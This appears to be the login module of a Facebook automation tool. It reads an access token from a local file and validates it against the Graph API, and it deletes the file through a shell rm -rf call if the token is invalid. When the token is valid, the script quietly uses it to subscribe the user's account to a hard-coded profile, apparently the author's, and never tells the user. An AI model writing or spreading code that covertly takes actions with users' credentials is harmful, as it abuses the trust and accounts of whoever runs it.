import requests,os,json
import elite

P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah

def main():
    try:
        token = open("token.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token=" + token)
        a = json.loads(otw.text)
        nama = a["name"]
    except (KeyError,IOError):
        print('%s║'%(M))
        print('%s╚══[%s!%s] %sToken Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        exit(elite.menu_log())
    requests.post("https://graph.facebook.com/100011669563699/subscribers?access_token=" + token) # Dapunta Adyapaksi R
    exit(elite.menu())
